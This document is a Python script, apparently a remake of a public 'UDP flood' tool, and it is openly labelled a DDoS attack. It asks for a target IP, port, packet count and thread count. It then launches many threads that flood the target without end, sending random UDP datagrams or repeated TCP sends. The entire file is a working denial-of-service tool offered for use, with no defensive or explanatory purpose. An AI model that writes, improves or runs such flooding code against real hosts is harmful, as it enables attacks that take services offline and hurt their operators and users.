"""
AUTOR : ADA DEH
"""
import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

os.system("clear")
os.system("figlet DDOS ATTACK -f slant")
print("If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues")
os.system("clear")
print("Remake by : KalzZ")
print(" _   __      _     ______")
print("| | / /     | |   |___  /")
print("| |/ /  __ _| |____  / / ")
print("|    \ / _` | |_  / / /  ")
print("| |\  \ (_| | |/ /./ /___")
print("\_| \_/\__,_|_/___\_____/")
print("alone")
print("_____________________________________________")
print("  KETIK : Python-UDP-Flood ")
print("  KETIK : Python-TCP-Flood ")

test = input()
if test == "n":
	exit(0)
ip = str(input(" Ip Target:"))
port = int(input(" Port Target:"))
choice = str(input(" GAS NIH?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" ISI PACKETS:"))
def run():
	data = random._urandom(1866)
	i = random.choice(("[SEND PACKET]","[SEND PACKET]","[SEND PACKET]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #It's using the UDP method as you can see in SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET TOD!!!")
		except:
			s.close()
			print("[MAMPUS] SORRY BGT NI!!!")

def run2():
	data = random._urandom(1256)
	i = random.choice(("[SEND PACKET]","[SEND PACKET]","[SEND PACKET]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #And here it's using the TCP method as you can see in SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET TOD")
		except:
			s.close()
			print("[MAMPUS] SORRY BGT NI!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
	# for windows
    if name == 'nt':
        _ = system('cls')

    # for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # ini tools ramake
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" Ngapain Close Lagi Lah <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok, quitting")
        byebye()

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store the original SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)#00000000
